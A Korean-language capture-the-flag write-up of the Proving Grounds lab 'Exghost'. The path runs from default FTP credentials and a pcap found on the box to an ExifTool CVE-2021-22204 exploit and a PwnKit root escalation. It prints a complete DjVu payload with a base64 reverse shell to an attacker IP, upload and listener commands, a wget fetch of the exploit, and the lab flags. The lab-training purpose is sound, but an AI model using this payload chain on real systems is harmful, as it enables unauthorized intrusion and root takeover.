> [!info] PG Practice — Pentester Foundations #7
> **타겟** 192.168.248.183 · **OS** Ubuntu 20.04 · **난이도** Fundamental · **플래그 2개**
> **경로 요약** FTP 기본자격(`user:system`) → 백업 파일이 **pcap** → pcap에서 `/exiftest.php` + **ExifTool 12.23** 확인 → **CVE-2021-22204** DjVu RCE → `www-data` → **PwnKit CVE-2021-4034** → root

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.183
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

22와 443은 `filtered`. 공격면은 **FTP와 웹 둘뿐**이다.

### FTP — 기본 자격증명

브리핑은 "브루트포스"라고 하지만 **`user` / `system`** 이 한 방에 통한다. 워드리스트를 돌리기 전에 흔한 조합부터 시도하는 게 항상 이득이다.

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ ftp -A 192.168.248.183
220 (vsFTPd 3.0.3)
Name: user
Password: system
230 Login successful.
ftp> ls
-rwxrwxrwx    1 0        0          126151 Jan 27  2022 backup
```

> [!danger] PASV(패시브) 모드가 방화벽에 막혀 있다
> 기본 패시브 모드로 붙으면 **`LIST`부터 타임아웃**한다. 데이터 채널 포트가 전부 필터링돼 있기 때문이다.
> **액티브 모드를 강제**해야 한다:
> ```bash
> ftp -A 192.168.248.183          # -A = active mode
> ```
> 파이썬이면 `ftplib.FTP.set_pasv(False)`.
> "FTP 로그인은 되는데 목록이 안 나온다" = **거의 항상 PASV/방화벽 문제**다. 자격증명을 의심하기 전에 모드를 바꿔봐라.

### `backup`은 확장자만 없을 뿐 pcap이다

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ file backup
backup: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

> [!tip] 확장자 없는 파일은 반드시 `file`로 확인한다
> `backup`이라는 이름만 보고 tar/zip으로 넘겨짚으면 시간을 버린다. **매직 바이트가 진실**이다.
> 954 패킷, 144초 분량, 2022-01-27 캡처.

### pcap 분석 — 이 박스에서는 pcap이 곧 정찰 자료다

954 패킷 중 **HTTP 트랜잭션은 딱 2건**이다. 나머지 926 프레임은 Firefox/Ubuntu 배경 DNS 노이즈(`detectportal.firefox.com`, `connectivity-check.ubuntu.com` 등).

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ tshark -r backup -Y http.request -T fields -e frame.number -e http.request.method -e http.host -e http.request.uri
66	GET	127.0.0.1	/
891	POST	127.0.0.1	/exiftest.php
```

HTTP 객체를 통째로 뽑아낸다:

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ tshark -r backup --export-objects http,http_objects/
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ ls -la http_objects/
%2f              502     업로드 폼 index.html (gzip 해제됨)
exiftest.php     14806   POST 멀티파트 본문 전체
exiftest(1).php  1072    서버 응답 — ExifTool 출력
```

**① 업로드 폼과 파라미터명** (`%2f` = 루트 응답):

```html
<form method="post" action="exiftest.php" enctype="multipart/form-data">
    <input type="file" name="myFile" />
    <input type="submit" value="Upload">
</form>
```

**② 실제 POST 요청** — 멀티파트 파트 헤더 원문:

```
POST /exiftest.php HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------169621313238602050593908562572

Content-Disposition: form-data; name="myFile"; filename="testme.jpg"
Content-Type: image/jpeg
```

**③ 서버 응답 — 핵심 발견:**

```
File uploaded successfully :)
ExifTool Version Number         : 12.23
File Name                       : phpopnW14.jpg
Directory                       : /var/www/html/uploads
File Size                       : 14 KiB
File Modification Date/Time     : 2022:01:27 14:47:37+02:00
```

여기서 세 가지가 동시에 나온다:

| 정보 | 값 | 의미 |
|---|---|---|
| **ExifTool 버전** | **12.23** | CVE-2021-22204 취약 범위(7.44–12.23). **12.23이 취약한 마지막 버전** — 12.24에서 수정 |
| 저장 경로 | `/var/www/html/uploads` | |
| 저장 파일명 | `phpopnW14.jpg` | PHP tmp 이름(`php`+6랜덤) — **예측 불가** |
| 동작 | exiftool 출력이 **응답에 그대로 반사** | 익스플로잇 성공/실패를 응답으로 즉시 확인 가능 |

> [!tip] 저장 파일명이 랜덤이어도 상관없다
> 보통 업로드 RCE는 "업로드한 웹셸을 다시 호출"해야 해서 저장 경로·파일명을 알아야 한다.
> **CVE-2021-22204는 exiftool이 파일을 파싱하는 순간 실행**된다. 되부를 필요가 없으니 파일명 예측 불가는 장애물이 아니다.
> 게다가 `/uploads/`는 403이라 리스팅도 안 된다 — 파일명에 의존하는 접근이었다면 여기서 막혔을 것이다.

### 라이브 타겟 상태 확인

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ curl -s -o /dev/null -w 'exiftest.php HTTP=%{http_code}\n' http://192.168.248.183/exiftest.php
exiftest.php HTTP=200
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ curl -s -o /dev/null -w '/ HTTP=%{http_code}\n' http://192.168.248.183/
/ HTTP=403
```

**pcap 속 index.html은 개발 당시 루프백에만 있었고, 지금은 `/`가 403이다.** 업로드 폼 페이지를 거칠 수 없으니 **`exiftest.php`에 직접 POST**를 쏴야 한다.

> [!note] pcap이 없었다면 이 박스는 막힌다
> `/`가 403이라 브라우저로는 폼을 볼 수 없고, 디렉터리 열거로 `exiftest.php`를 찾더라도 **파라미터명 `myFile`과 ExifTool 버전 12.23**은 알 수 없다.
> **과거 트래픽 캡처는 현재 접근 불가능한 정보를 담고 있다.** 백업·로그·캡처 파일을 발견하면 그 자체가 정찰 자료다.

### pcap에서 **나오지 않은** 것 (기록해둘 것)

- **평문 자격증명 없음** — `flag|passw|pwd|credential|secret|api_key|token|BEGIN PRIVATE` 스윕 결과 0건
- 쿠키·`Authorization`·`Set-Cookie` 헤더 없음
- DNS 엑스필 없음 (926개 DNS 프레임은 전부 정상 배경 트래픽, 고유 이름 10개)
- 트래픽 전부 `127.0.0.1` 루프백 — 외부 대화나 C2 없음
- 카빙한 `testme.jpg`(14582 B)는 **은닉 데이터 없는 평범한 테스트 이미지**. 스테가노 요소 아님

> [!tip] "없다"도 결론이다
> 포렌식에서 찾지 못한 것을 명시하는 것은 환각 방지 장치다. "자격증명이 있을 것"이라고 넘겨짚고 시간을 쓰는 대신, **스윕 결과 0건**을 기록하고 다음으로 넘어간다.

### 디렉터리 브루트포싱은 30만 건을 돌고도 실패했다

이 박스에서 가장 중요한 실측 결과다. 정찰 담당이 웹을 **전수에 가깝게** 긁었다:

| 스캔 | 워드리스트 | 요청 수 | 완주 | 결과 |
|---|---|---|---|---|
| ffuf 디렉터리 | `directory-list-2.3-medium.txt` | **220,560** | 100% | `uploads`(301), `server-status`(403) |
| ffuf 루트 파일 | `raft-medium-files.txt` × 5확장자 | 완주 | 100% | **200 응답 0건** |
| ffuf `/uploads/` | `raft-medium-files.txt` × 4확장자 | **85,645** | 100% | **0건** |
| 수동 추측 40개 | `exghost/ghost/exif/exiftool/upload/...` | 40 | — | 전부 404 |

**총 306,205건을 돌려서 찾은 것: 아무것도 없음.**

```
403  /              (인덱스 없음 + Options -Indexes)
301  /uploads   =>  /uploads/
403  /uploads/      (존재하나 리스팅 금지, 파일 열거 0건)
403  /server-status/
```

`Host:` 헤더를 `exghost`·`exghost.local`·`exghost.pg` 등으로 바꿔도 전부 기본 vhost 403 — 숨은 가상호스트도 없다.

이유는 단순하다. **`exiftest.php`가 어떤 표준 워드리스트에도 들어 있지 않다:**

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ for w in directory-list-2.3-medium.txt raft-medium-files.txt raft-large-files.txt common.txt; do
      printf '%-32s %s\n' "$w" "$(grep -ic '^exiftest' /path/to/$w)"
    done
directory-list-2.3-medium.txt    0
raft-medium-files.txt            0
raft-large-files.txt             0
common.txt                       0
```

`raft-large-files.txt` 전체에서 `exif`를 포함하는 항목은 **2개**뿐이고 그중 `exiftest`는 없다.

> [!danger] 워드리스트에 없는 것은 브루트포싱으로 찾을 수 없다 — 당연하지만 잊기 쉽다
> 30만 건을 완주해도 **개발자가 지어낸 커스텀 파일명**(`exiftest.php`)은 나오지 않는다.
> "충분히 큰 워드리스트를 돌렸는데 안 나온다 = 없다"는 **틀린 추론**이다. 다음을 시도해야 한다:
> - **다른 채널에서 파일명 얻기** — 백업/캡처/로그 파일, 소스 유출, JS 번들 내 하드코딩 경로, `robots.txt`, 에러 메시지
> - **앱 성격에서 이름 유추** — "exif"라는 힌트가 있으면 `exif.php`·`exiftest.php`·`exiftool.php`·`testexif.php` 같은 조합을 직접 만들어 시도
> - **다른 서비스에서 넘어오기** — 여기서는 FTP의 pcap이 답이었다
>
> 이 박스는 **"열거가 실패하는 상황"을 의도적으로 설계**했다. 그래서 FTP → pcap 경로가 정석인 것이다.

> [!note] 정찰 담당의 결론이 정확했다
> 웹만 본 정찰 담당은 "업로드 엔드포인트를 찾지 못했다"고 **솔직하게 보고**하면서, 정황(`/uploads/`만 존재 + 열린 포트가 FTP·HTTP 둘뿐 + `/uploads/` 파일 열거 0건)으로부터 **"진입 경로는 FTP일 것"**이라고 판단했다. 찾지 못한 것을 찾은 척하지 않는 것이 정확한 다음 수로 이어졌다.

### 갈림길 — pcap 없이도 뚫린다

침투 담당은 pcap을 기다리지 않고 **파라미터명을 브루트포싱**해서 직행했다. 두 경로 모두 유효하다는 게 이 박스의 교훈이다.

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9' > /tmp/t.jpg
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ for n in myFile file image upload fileToUpload userfile document; do
      echo -n "$n: "; curl -s -F "$n=@/tmp/t.jpg" http://192.168.248.183/exiftest.php
    done
myFile: File uploaded successfully :)
file: There is no file to upload.
image: There is no file to upload.
...
```

**응답 문구가 달라서 파라미터명이 그대로 새어나온다.** 20바이트짜리 최소 JPEG(`FFD8FFE0...FFD9`)면 충분하다.

root 획득 후 소스를 읽어 확정:

```php
// /var/www/html/exiftest.php
if (!isset($_FILES["myFile"])) { die("There is no file to upload."); }
...
$output = shell_exec('/var/www/html/exiftool ' . $newFilepath . ' > /var/www/html/reportsexif/' . $filename.".txt");
```

MIME 화이트리스트는 `image/png`·`image/jpeg`뿐이지만, **exif 페이로드는 정상 JPEG 안에 들어가므로 이 검증을 그대로 통과한다.**

> [!tip] 에러 메시지의 차이가 곧 정보다
> `There is no file to upload.` vs `File uploaded successfully :)` — 이 한 글자 차이로 파라미터명을 특정했다.
> **응답이 입력에 따라 달라지는 모든 지점은 열거 가능한 오라클**이다. 로그인 폼의 "존재하지 않는 사용자" vs "비밀번호가 틀렸습니다"와 같은 원리.

### CVE-2021-22204 — DjVu ANT 필드 Perl 인젝션

ExifTool은 DjVu 이미지의 ANT(annotation) 청크를 파싱할 때 내용을 **Perl `eval`에 넘긴다.** 여기에 코드를 심으면 파싱 시점에 실행된다.

```bash
# 1) 페이로드 — 리버스셸을 base64로 감싸 인용 문제 제거
┌──(kali㉿kali)-[~/PG/Exghost/exif]
└─$ echo -n '(metadata "\c${system('"'"'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy85MDAxIDA+JjE=|base64 -d|bash'"'"')};")' > payload

# 2) bzz 압축 → DjVu 컨테이너로 포장
└─$ bzz payload payload.bzz
└─$ djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTz=payload.bzz

# 3) 정상 JPEG를 만들고, DjVu를 EXIF 태그에 삽입
└─$ convert -size 64x64 xc:red image.jpg
└─$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' image.jpg
```

`configfile` (커스텀 EXIF 태그 정의 — 이게 있어야 DjVu를 태그에 넣을 수 있다):

```perl
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => { Name => 'HasselbladExif', Writable => 'string', WriteGroup => 'IFD0' },
    },
);
1; #end
```

내부 명령: `bash -i >& /dev/tcp/192.168.45.207/9001 0>&1`

> [!note] 왜 `.jpg`인데 DjVu가 파싱되나
> **ExifTool은 확장자가 아니라 매직 바이트로 포맷을 판별한다.** 겉은 정상 JPEG라 PHP의 MIME 검증을 통과하고, 내부 EXIF 태그에 박힌 DjVu 청크는 ExifTool이 알아서 찾아 파싱한다.
> 이 조합이 **검증 통과와 취약 코드 경로 진입을 동시에** 만족시킨다.

### 업로드 → `www-data`

```bash
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ tmux new-session -d -s exg 'rlwrap nc -lvnp 9001'
┌──(kali㉿kali)-[~/PG/Exghost]
└─$ curl -s -F 'myFile=@exif/image.jpg' http://192.168.248.183/exiftest.php
        (응답 없이 매달림)
```

> [!warning] 또 나왔다 — curl이 매달리는 것은 성공 신호
> exiftool이 리버스셸에 블록되어 PHP가 응답을 반환하지 못한다. **네 번째 변형이다.** 응답이 아니라 리스너를 봐라.

```bash
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.183] 39420
www-data@exghost:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@exghost:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@exghost:/var/www/html$ uname -a
Linux exghost 5.4.0-89-generic #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021 x86_64
```

### user 플래그 — 권한상승 전에 이미 읽힌다

```bash
www-data@exghost:/var/www/html$ ls -la /home/hassan/local.txt
-rw-r--r-- 1 hassan hassan 33 ... /home/hassan/local.txt
www-data@exghost:/var/www/html$ cat /home/hassan/local.txt
025666986d0c58902b71b127c23ca5bd
```

`-rw-r--r--` = **other 읽기 가능.** 권한상승을 기다릴 필요가 없다. `/home/user/`에는 플래그가 없다.

> [!tip] 셸을 잡으면 즉시 모든 홈의 플래그를 시도한다
> `cat /home/*/local.txt 2>/dev/null` 한 줄. 권한이 느슨하면 user 플래그는 그 자리에서 끝난다.

### Privesc — PwnKit (CVE-2021-4034)

```bash
www-data@exghost:/var/www/html$ pkexec --version
pkexec version 0.105
www-data@exghost:/var/www/html$ dpkg -l | grep policykit
hi  policykit-1  0.105-26ubuntu1.1  amd64  framework for managing administrative policies and privileges
```

`0.105-26ubuntu1.1` = 패치(`-26ubuntu1.2`) 이전 → **취약**.

> [!danger] 타겟에 컴파일러가 없다 — 파이썬 PoC를 써라
> PwnKit의 원조 PoC는 C 익스플로잇을 타겟에서 `gcc`로 빌드한다. 여기엔 컴파일러가 없다.
> [joeammond/CVE-2021-4034](https://github.com/joeammond/CVE-2021-4034)는 **msfvenom ELF를 base64로 내장**하고 있어 컴파일이 필요 없다. Python만 있으면 된다.

전송하고 **md5로 무결성까지 확인**한다(Squid에서 파일이 조용히 사라진 경험 반영):

```bash
# Kali
└─$ python3 -m http.server 8000
# 타겟
www-data@exghost:/tmp$ wget -q http://192.168.45.207:8000/CVE-2021-4034.py -O /tmp/pk.py
www-data@exghost:/tmp$ md5sum /tmp/pk.py
53f43d1a285c15491ad792a100b65bb5  /tmp/pk.py        ← Kali 원본과 일치
```

```bash
www-data@exghost:/tmp$ python3 /tmp/pk.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/proof.txt
1861a91dda3d6102fd70b610411b8635
```

`gid`가 33으로 남지만 `uid=0`이면 `/root` 읽기에 충분하다. ([[Levram]]의 cap_setuid와 같은 반쪽 root 형태)

### 플래그

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/hassan/local.txt` (`-rw-r--r--`) | `025666986d0c58902b71b127c23ca5bd` |
| `proof.txt` | `/root/proof.txt` | `1861a91dda3d6102fd70b610411b8635` |

## 이 박스의 두 갈래 — 어느 쪽이 정석인가

| | FTP/pcap 경로 (의도된 정석) | 웹 직행 경로 (실제로 쓴 것) |
|---|---|---|
| 시작 | FTP `user:system` → `backup` 다운로드 | 곧바로 `/exiftest.php` |
| 파라미터명 획득 | pcap의 멀티파트 헤더에서 `myFile` | 응답 문구 차이로 브루트포싱 |
| 버전 획득 | pcap 응답의 `ExifTool Version Number : 12.23` | 업로드 성공 후 반사된 출력에서 확인 |
| 난이도 | 쉬움(정보가 다 주어짐) | 조금 더 걸리지만 **자격증명 불필요** |

**정석 경로가 더 빠르지만, 웹 경로는 FTP 자격증명이 없어도 뚫린다.** 실전에서는 후자가 더 위험한 발견이다 — 인증 없이 RCE가 되는 엔드포인트가 인터넷에 노출돼 있다는 뜻이니까.

## OSCP 관점 정리

1. **워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다.** 30만 건 완주하고 0건이었다. `exiftest.php`는 어떤 표준 워드리스트에도 없다. **"큰 워드리스트로 안 나옴 = 없음"은 틀린 추론**이고, 다른 채널(백업·캡처·로그·JS 번들·에러 메시지)에서 파일명을 얻거나 앱 성격에서 이름을 유추해야 한다.
2. **확장자 없는 파일은 `file`로 확인한다.** `backup`이 pcap이었다. 이름으로 넘겨짚으면 시간을 버린다.
3. **FTP 로그인은 되는데 `LIST`가 멈추면 PASV 문제다.** `ftp -A`(액티브 모드) 또는 `set_pasv(False)`. 자격증명을 의심하기 전에 모드부터 바꿔라.
4. **응답 문구의 차이는 열거 오라클이다.** `There is no file to upload.` vs `File uploaded successfully :)` 로 폼 파라미터명을 특정했다. 20바이트 최소 JPEG면 충분하다.
5. **ExifTool은 확장자가 아니라 매직 바이트로 판별한다.** 겉은 JPEG(MIME 검증 통과), 속은 DjVu(취약 코드 경로) — 이 조합이 CVE-2021-22204의 핵심이다.
6. **또 curl이 매달렸다 — 네 번째다.** ([[Crane]] 타임아웃 · [[RubyDome]] `HTTP=000` · [[Astronaut]] `200`+로그인페이지 · 여기) **응답이 아니라 리스너를 봐라.**
7. **셸을 잡으면 즉시 `cat /home/*/local.txt`.** 여기서는 `-rw-r--r--`라 권한상승 전에 user 플래그가 나왔다.
8. **PwnKit은 파이썬 PoC를 준비해둬라.** 타겟에 컴파일러가 없는 경우가 흔하다. `joeammond/CVE-2021-4034`는 ELF를 내장해 컴파일이 불필요하다.
9. **파일 전송 후 `md5sum`으로 대조한다.** [[Squid]]에서 "다운로드 성공" 메시지가 거짓이었던 경험의 후속 조치.
10. **과거 캡처 파일은 현재 접근 불가능한 정보를 담는다.** `/`가 403이라 지금은 폼을 볼 수 없지만, pcap에는 폼 HTML이 그대로 남아 있었다.

## 남긴 흔적 (랩 정리용)

| 경로 | 내용 |
|---|---|
| `/var/www/html/uploads/phpM114GP.jpg` (22B) | 파라미터 브루트포싱용 더미 JPEG |
| `/var/www/html/uploads/phpBqJPfC.jpg` (604B) | 악성 CVE-2021-22204 이미지 |
| `/var/www/html/reportsexif/phpM114GP.txt` | 더미의 exif 리포트 |
| `/var/www/html/reportsexif/phpBqJPfC.txt` (0B) | 익스플로잇 트리거 시 생성 |
| `/tmp/pk.py` | PwnKit 파이썬 익스플로잇 |

삭제하지 않고 보고만 했다 — 랩 재검증에 쓸 수 있고 Stop/Revert 시 소멸한다. 타겟 원본 데이터는 수정하지 않았다.

## 관련 노트

- [[01. Pentest Foundations]] — Exghost 항목
- [[Crane]] · [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]] — 같은 컬렉션 앞 박스
